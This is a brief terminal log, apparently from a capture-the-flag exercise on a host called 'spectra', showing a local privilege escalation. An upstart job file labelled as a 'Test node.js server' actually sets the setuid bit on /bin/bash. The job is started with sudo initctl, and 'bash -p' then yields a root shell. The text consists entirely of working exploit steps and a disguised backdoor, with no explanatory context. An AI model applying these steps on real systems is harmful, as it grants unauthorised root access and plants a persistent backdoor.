1. katie@spectra /etc/init $ cat test.conf 
description "Test node.js server"
author      "katie"
start on filesystem or runlevel [2345]
stop on shutdown

script
chmod +s /bin/bash
end script

2. katie@spectra /etc/init $ sudo /sbin/initctl start test
	test start/running, process 5118

3. katie@spectra /etc/init $ /bin/bash -p